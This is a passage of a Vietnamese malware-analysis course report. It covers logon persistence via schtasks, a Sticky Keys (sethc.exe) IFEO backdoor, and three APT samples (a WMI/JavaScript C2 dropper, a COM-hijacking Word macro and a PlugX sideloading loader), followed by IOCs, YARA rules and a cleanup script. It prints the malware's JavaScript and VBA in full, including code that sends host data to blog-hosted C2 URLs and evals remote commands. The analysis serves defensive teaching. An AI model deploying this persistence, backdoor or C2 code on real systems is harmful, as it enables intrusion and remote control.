    wstring command =
        L"schtasks.exe /Create "
        L"/TN \"PersistenceLab\" "
        L"/SC ONLOGON "
        L"/TR \"\\\"" + wstring(self) + L"\\\"\" "
        L"/F";

    int result = _wsystem(command.c_str());

    return result == 0;
}

int main()
{
    bool result = hehe();

    if (result)
    {
        MessageBoxW(
            NULL,
            L"Hacked by kizapm!",
            L"hehe123",
            MB_OK | MB_ICONINFORMATION
        );
    }
    else
    {
        MessageBoxW(
            NULL,
            L"failed to hacked",
            L"hehe321",
            MB_OK | MB_ICONERROR
        );
    }

    return 0;
}
}

```

```

---

## 2.2. Kỹ thuật Image Hijack với sethc.exe (Sticky Keys) (10đ)

### 2.2.1. Bản chất cơ chế IFEO Debugger
Image File Execution Options (IFEO) nằm tại đường dẫn:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`

Khi hệ điều hành Windows chuẩn bị tạo mới một tiến trình dựa trên tên tệp thực thi (ví dụ `sethc.exe`), tiến trình tạo sẽ kiểm tra xem trong nhánh IFEO có subkey nào trùng tên với tệp thực thi hay không. Nếu có subkey đó và chứa giá trị chuỗi `Debugger`:
- Windows sẽ **không** chạy tệp gốc.
- Thay vào đó, Windows sẽ thực thi tệp được khai báo trong giá trị `Debugger` và truyền tên tệp gốc làm tham số.

### 2.2.2. Các bước thiết lập Image Hijack cho `sethc.exe`
`sethc.exe` là tệp nhị phân hệ thống của tính năng Sticky Keys (Trợ năng ghim phím). Tệp này có đặc điểm đặc biệt: **có thể được gọi ngay tại màn hình đăng nhập (Lock screen / Logon screen) khi chưa có người dùng nào đăng nhập**.

#### Thực hiện qua Registry Command (Lab Environment):
Mở Command Prompt với quyền Quản trị viên (Administrator) và nhập lệnh:
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

Hoặc sử dụng tệp cấu hình `.reg`:
```reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe]
"Debugger"="C:\\Windows\\System32\\cmd.exe"
```

### 2.2.3. Thực nghiệm chứng minh: Kích hoạt Payload bằng 5 lần phím Shift
1. **Tại màn hình Desktop bình thường:**
   - Nhấn phím `Shift` liên tục 5 lần.
   - Bình thường Windows sẽ bật hộp thoại hỏi kích hoạt "Sticky Keys".
   - Sau khi thiết lập Hijack: Cửa sổ dòng lệnh `cmd.exe` lập tức mở ra thay vì hộp thoại Sticky Keys.
2. **Tại màn hình Khóa / Đăng nhập (Lock Screen - Win + L):**
   - Khóa máy tính bằng tổ hợp phím `Windows + L`.
   - Tại màn hình yêu cầu nhập mật khẩu (chưa hề đăng nhập), nhấn phím `Shift` liên tục 5 lần.
   - Cửa sổ `cmd.exe` lập tức xuất hiện ngay trên màn hình khóa.

## 3. Phân tích Chi tiết Mẫu 1: a.rar (`a.exe`)

### 3.1. Thông số kỹ thuật & Mã băm
* **Tên tệp gốc:** `a.exe`
* **Kích thước:** 20,481 bytes
* **Kiến trúc:** PE32 (x86 32-bit Console/GUI, Subsystem 2: Windows GUI)
* **Thời gian biên dịch (TimeDateStamp):** `1407852077` (Tue, 12 Aug 2014 14:01:17 UTC)
* **MD5:** `bc45beb8b862d2136a070ae793685386`
* **SHA1:** `d7021f32a4b273aa40a5b9717333dac9c2155e8a`
* **SHA256:** `2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9`
* **ImpHash:** `8812ff21aeb160e8800257140acae54b`
* **Chữ ký diệt virus (AV Detection):** `Trojan:Win32/Wacatac.B!ml`

### 3.2. Ngụy trang hệ thống & Timestomping
1. **Thu thập đường dẫn:** Gọi `GetSystemDirectoryA` để lấy thư mục `C:\Windows\system32`.
2. **Sao chép ngụy trang:** Sao chép tệp thực thi vào đường dẫn:
   ```text
   C:\Windows\system32\Instell.exe
   ```
   *(Chú ý: Tên tệp cố ý viết chệch chữ "Install" thành "Instell" nhằm qua mắt quản trị viên kiểm tra nhanh danh sách tiến trình).*
3. **Timestomping:** Sử dụng API `CreateFileA`, `GetSystemTime`, `SystemTimeToFileTime` và `SetFileTime` để chỉnh sửa mốc thời gian tạo và sửa đổi của `Instell.exe` trùng khớp với thời gian của các tệp hệ thống Windows gốc, vô hiệu hóa việc phân loại tệp mới tạo của các công cụ Forensics.
4. **Ghi nhật ký:** Mã độc mở và ghi thông tin trạng thái quá trình khởi tạo vào tệp nhật ký:
   ```text
   \httpcom.log
   ```

### 3.3. Giải mã bộ nhớ & Cơ chế WMI Event Consumer Persistence
Tại địa chỉ RVA `0x1000 - 0x105f`, mã độc thực hiện một vòng lặp giải mã nhị phân trong bộ đệm:
* Bộ đệm mã hóa đặt tại địa chỉ Virtual Address: `0x403028`.
* Độ dài: `4,986 bytes` (được đọc từ trường kích thước tại `0x403024`).
* Khóa byte 1: `0x63` (tại `0x403021`).
* Khóa byte 2: `0xe9` (tại `0x403020`).

Công thức giải mã:
```c
for (int i = 0; i < length; i++) {
    buffer[i] = buffer[i] ^ 0x63 ^ 0xe9;
}
```

Sau khi giải mã, mã độc nạp thư viện `ole32.dll`, gọi `CoInitialize` và `CoCreateInstance` với CLSID `{0E59F1D5-1FBE-11D0-8FF2-00A0D10038BC}` (`CLSID_IActiveScript`) để khởi tạo engine `JavaScript`, thực thi đoạn mã script vừa giải mã.

### 3.4. Dead-Drop Resolver C2 qua RSS Blog
Đoạn mã JavaScript trích xuất cho thấy cơ chế liên lạc C2 hoàn toàn gián tiếp qua Dead-Drop:
* **Mục tiêu:** Tránh để lộ IP/Domain C2 cố định trong mã nhị phân.
* **Kênh truyền:** Truy vấn bản tin RSS của các trang blog cá nhân:
  * `http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm`
  * `http://blogs.rediff.com/anilchopra/feed/`
  * `http://www.blogster.com/kapoorsunil09/profile/rss`
* **Thuật toán giải mã URL C2 (`circleDecode`):**
  Bóc tách chuỗi nằm trong tiêu đề bài viết định dạng `<title>@(chuỗi_mã_hóa)@</title>`. Sau đó thực hiện dịch chuyển ký tự vòng tròn để tái tạo URL C2 thực tế.
* **Gửi dữ liệu trinh sát (Reconnaissance):**
  Thu thập thông tin hệ thống nạn nhân gửi qua phương thức HTTP POST:
  ```text
  cstype=server&authname=servername&authpass=serverpass&hostname=<Tên_máy>&ostype=<Hệ_điều_hành>&macaddr=<MAC>&owner=XDD&version=2.0.0&runtime=<Thời_gian>
  ```
* **Nhận và thực thi lệnh:**
  Phản hồi từ C2 được tìm kiếm trong thẻ `<div id="0a552b5a4352">`. Nội dung được giải mã bằng hàm `Decode` (XOR đảo byte) và thực thi trực tiếp bằng `eval()`.

### 3.5. Mã nguồn JavaScript Bóc tách từ a.exe
```javascript
function e(e, t) {
    var n = "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription",
        r = GetObject(n + ":ActiveScriptEventConsumer").spawninstance_();
    r.name = "ProbeScriptFint", 
    r.scriptingengine = "javascript", 
    r.ScriptText = t + "var sOwner='" + e + "';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\"%PCI%\\\" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version+'&runtime='+$.runtime;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\"scrcons.exe\\\"'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');var re=/<title>@(.*)@<\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i<commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\\''+commands[i].id+'\\':\\''+escape(result)+'\\'';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();";
    var i = r.Put_();
    r = GetObject(n + ":__IntervalTimerInstruction").spawninstance_(), 
    r.Timerid = "ProbeScriptFint", 
    r.IntervalBetweenEvents = 6e3, 
    r.Put_(), 
    r = GetObject(n + ":__EventFilter").spawninstance_(), 
    r.name = "ProbeScriptFint", 
    r.Query = 'select * from __timerevent where timerid="ProbeScriptFint"', 
    r.QueryLanguage = "WQL";
    var s = r.Put_();
    return r = GetObject(n + ":__FilterToConsumerBinding").SpawnInstance_(), 
    r.Consumer = i.path, 
    r.Filter = s.path, 
    r.Put_(), "";
};
e("XDD", 'var sXmlUrl="http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss";');
```

---

## 4. Phân tích Chi tiết Mẫu 2: b.rar (`malw.rtf`)

### 4.1. Cấu trúc tệp tin MHTML & Ngụy trang RTF
* **Tên tệp:** `malw.rtf`
* **Kích thước:** 949,986 bytes
* **Mã băm SHA256:** `61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2`
* **Nhận diện AV:** `Exploit:Win32/Wopebol.G2`
* **Bản chất tệp:** Mặc dù mang phần mở rộng `.rtf`, tệp tin thực chất có header:
  ```text
  MIME-Version: 1.0
  Content-Type: multipart/related; boundary="----=_NextPart_01D495FF.1931A4F0"
  ```
  Microsoft Word được thiết kế tự động giải mã cấu trúc MIME đa phần này mà không đưa ra cảnh báo sai định dạng tệp.

Cấu trúc các thành phần bên trong:
* `file:///C:/B1344472/nb2.htm` (829,909 bytes): Trang HTML chứa nội dung văn bản hiển thị và bảng `Table 1` lưu trữ mã nhị phân Base64.
* `file:///C:/B1344472/nb2_files/editdata.mso` (5,226 bytes): Gói ActiveMime chứa luồng nén zlib của cấu trúc OLE Macro.

### 4.2. Bóc tách Macro VBA & Kỹ thuật COM Hijacking
Giải mã luồng `ActiveMime` phát hiện project VBA `ThisDocument` chứa mã thực thi tự động `Document_Open()`:

```visualbasic
Private Sub Document_Open()
    On Error Resume Next
    Dim sAppData As String
    sAppData = Environ("APPDATA")
    sAppData = sAppData & "\main_background.png"
    Dim myWS As Object, strPath
    Set myWS = CreateObject("WScript.Shell")
    Set fsoCheck = VBA.CreateObject("Scripting.FileSystemObject")
    Dim iCheck As Boolean
    iCheck = False
    
    #If Win64 Then
    #Else
        If (fsoCheck.FileExists("C:\Windows\SysWOW64\cmd.exe") = True) Then
            iCheck = True
        Else
            iCheck = False
        End If
    #End If
    
    If iCheck = True Then
        Dim wsh As Object
        Set wsh = VBA.CreateObject("WScript.Shell")
        Dim waitOnReturn As Boolean: waitOnReturn = True
        Dim windowStyle As Integer: windowStyle = 0
        wsh.Run "cmd.exe /S /C reg add  HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32 /ve /t REG_SZ /d " & sAppData & " /f /reg:64", windowStyle, waitOnReturn
    Else
        If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\") = False Then
            myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\", "", "REG_SZ"
        End If
        If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32\") = False Then
            If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\") = False Then
                myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\", "", "REG_SZ"
            End If
            myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32\", sAppData, "REG_SZ"
        End If
    End If

    Dim b As String
    Dim a As String
    Dim tableNew As Table
    Set tableNew = ActiveDocument.Tables(1)
    If (iCheck = True) Then
        a = tableNew.Cell(1, 1).Range.Text
        a = Left(a, Len(a) - 2)
        b = Base64Decode(a, sAppData)
    Else
        a = tableNew.Cell(1, 2).Range.Text
        a = Left(a, Len(a) - 2)
        b = Base64Decode(a, sAppData)
    End If
End Sub
```

#### Mục đích của kỹ thuật:
1. Ghi đè hoặc tạo mới khóa COM InprocServer32:
   ```text
   HKCU\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32
   ```
2. Giá trị mặc định của khóa trỏ đến: `%APPDATA%\main_background.png`.
3. Khi Windows kích hoạt đối tượng COM này (qua Explorer, Taskbar hoặc ứng dụng thứ ba), Windows API sẽ gọi `LoadLibrary("%APPDATA%\\main_background.png")`. Hệ điều hành sẽ xử lý tệp `.png` này như một thư viện PE DLL hoàn chỉnh bất kể phần mở rộng là gì.

### 4.3. Giải mã nhị phân x86/x64 DLL từ Table Document
Trong `nb2.htm`, dữ liệu Base64 lưu tại `Table 1`:
* **Cell 1 (Dành cho hệ 64-bit hoặc WOW64):** Chứa DLL x86 32-bit (Kích thước sau giải mã: 297,472 bytes).
  * MD5: `5f7f60e9fcc992794feb2d6e9908d1c3`
  * SHA256: `18cc477fb8f4c147f3c31d0fdbb5ab8fdff12a75bb9b23e3c3927090537eff41`
* **Cell 2 (Dành cho hệ 32-bit thuần túy):** Chứa DLL x64 64-bit (Kích thước sau giải mã: 292,352 bytes).
  * MD5: `3b36fb3a8cf15b0c5a288329e357e916`
  * SHA256: `fd33b2952127554ffcf3940a35fa18a0cb035847eb685a5b6a94555cd825baeb`

### 4.4. Cơ chế Process Injection & Anti-Sandbox
Khi DLL được nạp qua `LoadLibrary`, hàm `DllMain` tại `0x10001070` thực thi:
1. `Sleep(0x2710)`: Ngủ 10,000 miligiây (10 giây) để bỏ qua các sandbox có cấu hình timeout ngắn.
2. `OpenProcess(0x1fffff, 0, GetCurrentProcessId())`: Lấy toàn quyền kiểm soát tiến trình (`PROCESS_ALL_ACCESS`).
3. `VirtualAllocEx(hProcess, NULL, 0x37088, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)`: Cấp phát vùng nhớ RWX dung lượng **225,416 bytes**.
4. `WriteProcessMemory(hProcess, pRemoteBuf, 0x10012760, 0x37088, NULL)`: Sao chép khối shellcode được nhúng sẵn từ section `.data` của DLL sang vùng nhớ RWX.
5. `CreateThread(NULL, 0, pRemoteBuf, NULL, 0, NULL)`: Khởi tạo luồng riêng biệt để thực thi shellcode.

### 4.5. Phân tích Shellcode & Sub-PE (WinHTTP Downloader)
* Shellcode tại `0x10012760` bắt đầu bằng lệnh Position Independent Code (PIC):
  ```asm
  0x0: call $+5
  0x5: pop ecx
  0x6: sub ecx, 5
  ```
* Bằng cách duyệt qua cấu trúc `FS:[0x18]` (TEB) $\rightarrow$ `[EAX+0x30]` (PEB) $\rightarrow$ `InMemoryOrderModuleList`, shellcode tìm được địa chỉ cơ sở của `kernel32.dll` và định vị các hàm `VirtualAlloc`, `VirtualProtect`.
* Tại offset `4,232` (hex: `0x1088`) của shellcode là một **tệp tin PE thứ hai hoàn chỉnh (Sub-PE)**.
* **Chức năng Sub-PE:** Được viết bằng C++ và sử dụng `WINHTTP.dll` làm module giao tiếp mạng:
  * Nạp các API mạng: `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpSendRequest`, `WinHttpReceiveResponse`, `WinHttpReadData`.
  * Hỗ trợ cờ dòng lệnh: ` -u Url -t Time(Milisecond)`.
  * Chuỗi User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)`.
  * Hỗ trợ kết nối cả cổng 443 (HTTPS) và cổng 80 (HTTP) để nhận lệnh và tải payload giai đoạn kế tiếp.

---

## 5. Phân tích Chi tiết Mẫu 3: c.rar (Bộ kit DLL Sideloading)

Bộ kit này áp dụng chiến thuật **APT Triad** cổ điển:

```text
[McAfee.exe] (140,576 B)        --> Tệp sạch, có chữ ký số của McAfee Inc.
[McUtil.dll] (3,072 B)          --> Thư viện DLL độc hại đóng vai trò Sideload Loader
[McUtil.dll.mc] (116,946 B)     --> Dữ liệu Shellcode Payload (PlugX)
```

### 5.1. File hợp pháp McAfee.exe (`mcoemcpy.exe`)
* **Tên tệp gốc (OriginalFilename):** `mcoemcpy.exe`
* **Mô tả:** McAfee OEM Info Copy Files (Phiên bản: 2.1.115.0)
* **Bản quyền:** Copyright © 2006 McAfee, Inc.
* **Chữ ký số (Authenticode):** Có chữ ký số x.509 hợp lệ của McAfee Inc. (Security Directory offset `0x21000`, dung lượng 5,408 bytes).
* **Mã băm SHA256:** `3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe`
* **Cơ chế tải phụ thuộc:** Tiến trình `mcoemcpy.exe` cần nạp thư viện `McUtil.dll` để hỗ trợ sao chép tệp OEM. Khi kẻ tấn công đặt `McUtil.dll` giả mạo vào cùng thư mục với `McAfee.exe`, cơ chế nạp DLL mặc định của Windows sẽ ưu tiên tải tệp trong thư mục ứng dụng trước khi tìm kiếm trong System32.

### 5.2. Thư viện giả mạo McUtil.dll & Kỹ thuật Inline Hooking
* **Kích thước:** Chỉ 3,072 bytes (3 KB).
* **Mã băm SHA256:** `021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4`
* **Exports:** Không chứa bất kỳ hàm export nào (mục đích chỉ cần nạp vào không gian nhớ).

#### Toàn bộ logic thực thi ngược (Disassembly Walkthrough):
1. **Kiểm tra kích hoạt hẹn giờ (Time-bomb Delay):**
   Tại `0x10001100`:
   ```asm
   call GetSystemTime
   movzx ecx, word ptr [esp + 4]    ; Lấy Year
   movzx edx, word ptr [esp + 6]    ; Lấy Month
   imul ecx, ecx, 100
   add ecx, edx
   imul ecx, ecx, 100
   add ecx, eax                     ; Lấy Day
   cmp ecx, 0x1335045               ; So sánh với ngưỡng ngày chỉ định
   jge 0x10001135                   ; Nếu thỏa mãn mới tiến hành hook
   ```
2. **Kỹ thuật Inline Hooking trên McAfee.exe:**
   * Lấy địa chỉ nạp gốc của `McAfee.exe` bằng `GetModuleHandleA(0)`.
   * Vị trí hook: `McAfee.exe + 0x2f0c`.
   * Gọi `VirtualProtect(McAfeeBase + 0x2f0c, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect)`.
   * Tính toán khoảng cách tương đối (relative offset) giữa `0x10001000` (hàm độc hại trong `McUtil.dll`) và `McAfeeBase + 0x2f0c`.
   * Ghi đè 5 byte tại `0x2f0c`:
     ```text
     E9 <Relative_Offset_To_0x10001000>
     ```
   * Khi tiến trình hợp pháp `McAfee.exe` tiếp tục chu trình khởi chạy bình thường, CPU chạm vào offset `0x2f0c` và lập tức nhảy vào hàm độc hại `0x10001000`.

### 5.3. Kích hoạt & Nạp Payload McUtil.dll.mc (PlugX Loader)
Tại hàm `0x10001000`:
1. Gọi `VirtualAlloc(0, 0x10007B, MEM_COMMIT, PAGE_EXECUTE_READWRITE)` để cấp phát **1,048,699 bytes** bộ nhớ thực thi.
2. Gọi `GetModuleFileNameW` lấy đường dẫn của tiến trình, tìm dấu `\` cuối cùng và thay thế tên tệp thành `McUtil.dll.mc`.
3. Mở tệp bằng `CreateFileW("...\\McUtil.dll.mc", GENERIC_READ, FILE_SHARE_READ, ...)` và nạp toàn bộ 116,946 bytes vào buffer RWX bằng `ReadFile`.
4. Kích hoạt payload:
   ```asm
   0x100010cb: pushal
   0x100010cc: mov ecx, 0
   0x100010d1: push ecx
   0x100010d2: mov ecx, [allocated_rwx_buffer]
   0x100010d5: call ecx            ; Nhảy thẳng vào thực thi McUtil.dll.mc như shellcode
   0x100010d7: popal
   ```
5. Sau khi payload khởi chạy, mã độc gọi:
   ```asm
   0x100010ef: push -1
   0x100010f1: call Sleep          ; Sleep(-1) = Ngủ vô tận
   ```
   Điều này giúp tiến trình `McAfee.exe` không bao giờ kết thúc, duy trì vỏ bọc hợp pháp trong Task Manager để che giấu hoạt động ngầm của trojan PlugX.

---

## 6. Bảng Chỉ số Nhận diện Mối đe dọa (IOCs)

### 6.1. Mã băm Tệp tin (File Hashes)

| Tệp tin | Kích thước | MD5 | SHA256 |
| :--- | :--- | :--- | :--- |
| `a.exe` | 20,481 B | `bc45beb8b862d2136a070ae793685386` | `2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9` |
| `malw.rtf` | 949,986 B | `0a5a0c889fd8772da489a327d4fdd8d6` | `61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2` |
| `main_background.png` (x86) | 297,472 B | `5f7f60e9fcc992794feb2d6e9908d1c3` | `18cc477fb8f4c147f3c31d0fdbb5ab8fdff12a75bb9b23e3c3927090537eff41` |
| `main_background.png` (x64) | 292,352 B | `3b36fb3a8cf15b0c5a288329e357e916` | `fd33b2952127554ffcf3940a35fa18a0cb035847eb685a5b6a94555cd825baeb` |
| `McAfee.exe` | 140,576 B | `884d46c01c762ad6ddd2759fd921bf71` | `3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe` |
| `McUtil.dll` | 3,072 B | `fe6f322a0c3e25947988d6fad92637b2` | `021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4` |
| `McUtil.dll.mc` | 116,946 B | `402a04ce4f1ebda0e8e9447b1fb7a4ee` | `58648fed34d7617c3217af047f331cb8e16012b8ae7d4fdebf77e31f6fa79cb5` |

### 6.2. Dấu vết Mạng (Network & C2 Indicators)
* `http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm`
* `http://blogs.rediff.com/anilchopra/feed/`
* `http://www.blogster.com/kapoorsunil09/profile/rss`
* Chuỗi User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)`
* Chuỗi User-Agent phụ: `Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5`

### 6.3. Dấu vết Hệ thống & Khóa Registry (Host Artifacts)
* **WMI Event Consumer:** `ProbeScriptFint` (`root\subscription:ActiveScriptEventConsumer`)
* **WMI Filter:** `root\subscription:__EventFilter` (`Query = select * from __timerevent where timerid="ProbeScriptFint"`)
* **COM Hijacking Registry Key:**
  ```text
  HKCU\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32
  ```
* **Đường dẫn tệp nghi vấn:**
  * `C:\Windows\system32\Instell.exe`
  * `C:\Windows\system32\httpcom.log`
  * `%APPDATA%\main_background.png`
  * `McUtil.dll.mc`

---

## 7. Quy tắc Nhận diện (YARA Rules) & Khuyến nghị Phòng thủ

### 7.1. Quy tắc YARA phát hiện

```yara
rule APT30_WMI_ActiveScript_Dropper {
    meta:
        description = "Detects APT30 / SPACESHIP WMI Event Consumer Dropper"
        author = "Security Analysis Team"
        date = "2026-10-12"
        hash = "2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9"
    strings:
        $s1 = "Instell.exe" ascii
        $s2 = "httpcom.log" ascii
        $s3 = "ProbeScriptFint" ascii wide
        $s4 = "ActiveScriptEventConsumer" ascii wide
        $s5 = "JavaScript" wide
    condition:
        uint16(0) == 0x5A4D and (3 of ($s*))
}

rule Malw_MHTML_COM_Hijack_Dropper {
    meta:
        description = "Detects MHTML Document with COM Hijack VBA Macro"
        author = "Security Analysis Team"
        date = "2026-10-12"
        hash = "61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2"
    strings:
        $clsid = "{2DEA658F-54C1-4227-AF9B-260AB5FC3543}" ascii wide
        $target = "main_background.png" ascii wide
        $mime = "multipart/related" ascii
    condition:
        $mime at 0 and ($clsid or $target)
}

rule Sideloading_McUtil_Loader {
    meta:
        description = "Detects malicious McUtil.dll sideloading component"
        author = "Security Analysis Team"
        date = "2026-10-12"
        hash = "021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4"
    strings:
        $mc = "McUtil.dll.mc" wide
        $valloc = "VirtualAlloc" ascii
        $rfile = "ReadFile" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10KB and all of them
}
```

### 7.2. Kịch bản Rà soát & Dọn dẹp (PowerShell Incident Response)

Nếu nghi ngờ hệ thống đã kích hoạt các mẫu mã độc này, thực hiện lệnh PowerShell sau (với quyền Administrator):

```powershell
# 1. Rà soát và gỡ bỏ WMI Event Consumer độc hại (Mẫu A)
Get-CimInstance -Namespace root\subscription -ClassName ActiveScriptEventConsumer | 
    Where-Object { $_.Name -eq "ProbeScriptFint" } | 
    Remove-CimInstance

Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | 
    Where-Object { $_.Name -eq "ProbeScriptFint" } | 
    Remove-CimInstance

Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | 
    Where-Object { $_.Filter.Name -eq "ProbeScriptFint" } | 
    Remove-CimInstance

# 2. Xóa tệp ngụy trang trong System32
if (Test-Path "C:\Windows\system32\Instell.exe") {
    Stop-Process -Name "Instell" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\system32\Instell.exe", "C:\Windows\system32\httpcom.log" -Force
}

# 3. Rà soát và xóa khóa COM Hijack (Mẫu B)
$regPath = "HKCU:\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}"
if (Test-Path $regPath) {
    Remove-Item -Path $regPath -Recurse -Force
}
if (Test-Path "$env:APPDATA\main_background.png") {
    Remove-Item -Path "$env:APPDATA\main_background.png" -Force
}

# 4. Rà soát tiến trình McAfee giả mạo chạy từ thư mục ngoài Program Files (Mẫu C)
Get-Process -Name "McAfee" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Path -notlike "C:\Program Files\McAfee\*" -and $_.Path -notlike "C:\Program Files (x86)\McAfee\*") {
        Write-Warning "Phat hien tien trinh McAfee bi sideloading tai: $($_.Path)"
        Stop-Process -Id $_.Id -Force
    }
}
```

---
*Báo cáo được khởi tạo tự động bởi Hệ thống Phân tích Mã độc Chuyên sâu Antigravity.*

*Báo cáo được hoàn thành phục vụ học phần Phân tích Mã độc - Khóa đào tạo An toàn Thông tin.*
